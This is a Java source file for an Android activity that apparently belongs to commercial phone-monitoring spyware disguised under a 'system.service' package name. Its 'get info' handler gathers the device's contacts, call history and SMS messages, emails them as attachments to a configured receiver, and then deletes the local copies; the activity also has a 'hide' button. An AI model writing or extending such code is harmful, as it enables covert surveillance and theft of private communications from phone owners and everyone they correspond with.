package system.service.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;

import system.service.GetInfoTask;
import system.service.R;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class InitActivity extends Activity 
{
    protected static final String LOGTAG = "InitActivity";
    
    private final static int DEFAULT_RETRY_COUNT = 3;
    
	Button btn_getinfo;
    Button btn_screenshot;
    Button btn_setting;
    Button btn_hide;
    TextView hint_getinfo;
    TextView hint_screenshot;
    TextView hint_setting;
    TextView hint_hide;
    OnClickListener listener_getinfo = null;
    OnClickListener listener_screenshot = null;
    OnClickListener listener_setting = null;
    OnClickListener listener_hide = null;
    
    private Context context;
    
    private ProgressDialog progressDialog;
    
    private final int DISABLE_GETINFO_BTN = 0;
    private final int ENABLE_GETINFO_BTN  = 1;
    private final int SEND_MAIL_SUCCESS   = 2;
    private final int SEND_MAIL_FAIL      = 3;
    private final int NETWORK_DISCONNECTED = 4;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.init);
        
        context = getApplicationContext();
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	btn_getinfo = (Button)findViewById(R.id.btn_getinfo);
    	btn_getinfo.setOnClickListener(listener_getinfo);
        btn_screenshot = (Button)findViewById(R.id.btn_screenshot);
        btn_screenshot.setOnClickListener(listener_screenshot);
        btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
        btn_hide = (Button)findViewById(R.id.btn_hide);
        btn_hide.setOnClickListener(listener_hide);
        hint_getinfo = (TextView)findViewById(R.id.hint_getinfo);
        hint_screenshot = (TextView)findViewById(R.id.hint_screenshot);
        hint_setting = (TextView)findViewById(R.id.hint_setting);
        hint_hide = (TextView)findViewById(R.id.hint_hide);
        
        // Set button status
        boolean enabled = false;
        if (ConfigCtrl.getLicenseType(context) != LICENSE_TYPE.NOT_LICENSED &&
        	GlobalPrefActivity.getReceiverMail(context).length() > 0) enabled = true;
        
        btn_getinfo.setEnabled(enabled);
        hint_getinfo.setEnabled(enabled);
        
        btn_screenshot.setEnabled(enabled);
        hint_screenshot.setEnabled(enabled);
        btn_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
        hint_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
    	// Enable buttons if the mail address is valid
		Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
		String mailAddr = GlobalPrefActivity.getReceiverMail(getApplicationContext());
	    if (mailAddr.length() > 0) {
	    	Matcher matcher = p.matcher(mailAddr);
   	 		if (matcher.matches()) {
   	 			btn_getinfo.setEnabled(true);
   	 			btn_screenshot.setEnabled(true);
   	 			hint_getinfo.setEnabled(true);
   	 			hint_screenshot.setEnabled(true);
   	 		}
	    }
	    
	    LICENSE_TYPE licType = ConfigCtrl.getLicenseType(context);
		boolean hasPaid = (licType != LICENSE_TYPE.NOT_LICENSED && licType != LICENSE_TYPE.TRIAL_LICENSED);
    	if (resultCode == RESULT_OK && hasPaid) 
    	{
    		// Send the receiver info SMS to server to update record in database
			boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
			if (hasChangedReceiverInfo) {
				//SmsCtrl.sendReceiverInfoSms(context); TODO temp do not send info to server
			}
    	}
    }
    
    private void setListener()
    {
    	listener_getinfo = new OnClickListener()
        {
            public void onClick(View v)
            {
            	// If neither in trail and nor licensed, return
            	LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
    			if ((type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context)) ||
    				type == LICENSE_TYPE.NOT_LICENSED) {
    				SysUtils.messageBox(context, context.getResources().getString(R.string.msg_has_sent_trial_expire_sms));
    				return;
    			}
            	
            	progressDialog = ProgressDialog.show(InitActivity.this, getResources().getString(R.string.init_processing), 
            			getResources().getString(R.string.init_waiting), true, false);
            	
            	// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
    					
    					// If network connected, try to collect and send the information
    					if (!NetworkUtil.isNetworkConnected(context)) {
    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
        		
    					// Clear attachments
    					if (GetInfoTask.attachments == null) 
    						GetInfoTask.attachments = new ArrayList<File>();
    					else
    						GetInfoTask.attachments.clear();
        		
    					// Collect info
    					GetInfoTask.CollectContact(context);
    					GetInfoTask.CollectPhoneCallHist(context);
    					GetInfoTask.CollectSms(context);
        		
    					// If network connected, try to collect and send the information
    					if (!NetworkUtil.isNetworkConnected(context)) {
    						// Clean the files in SD-CARD
        					FileCtrl.cleanFolder();
        					
    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
        	
    					// Send mail
    					String phoneNum = ConfigCtrl.getSelfName(context);
    					String subject = getResources().getString(R.string.mail_from) 
        	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
        	          		 + getResources().getString(R.string.mail_description);
    					String body = String.format(getResources().getString(R.string.mail_body), phoneNum);
    					String[] recipients = GlobalPrefActivity.getReceiverMail(context).split(",");
    					if (recipients.length == 0) {
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
    					String pwd = MailCfg.getSenderPwd(context);
        		
    					boolean result = false;
    					int retry = DEFAULT_RETRY_COUNT;
    					while(!result && retry > 0)
    					{
    						String sender = MailCfg.getSender(context);
    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, GetInfoTask.attachments);
    						if (!result) retry--;
    					}
    					if(result) {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_SUCCESS, 0);
    					} else {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_FAIL, 0);
    					}
    					GetInfoTask.attachments.clear();
        		
    					// Update the last date time
    					if (result) {
    						boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
    					}
        		
    					// Clean the files in SD-CARD
    					FileCtrl.cleanFolder();
    					
    					mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    				}
    			}).start();
            }
            
        };
        
        listener_screenshot = new OnClickListener()
        {
            public void onClick(View v)
            {
                //TODO
            }
        };
        
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
            	Bundle bundle = new Bundle();
            	bundle.putBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO, false);
            	intent.putExtras(bundle);
            	startActivityForResult(intent, R.layout.init);
            }
        };
        
        // Exit the dialog
        listener_hide = new OnClickListener()
        {
            public void onClick(View v)
            {
                finish();
            }
        };
    }
    	
    // Update UI 
    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
               case DISABLE_GETINFO_BTN: {
              	   btn_getinfo.setEnabled(false);
                   break;
               }
               case ENABLE_GETINFO_BTN: {
             	   btn_getinfo.setEnabled(true);
              	   break;
               }
               case NETWORK_DISCONNECTED: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
            	   break;
               }
               case SEND_MAIL_SUCCESS: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
            	   break;
               }
               case SEND_MAIL_FAIL: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
            	   break;
               }
               default:
                   break;
            }
        }
    };
}
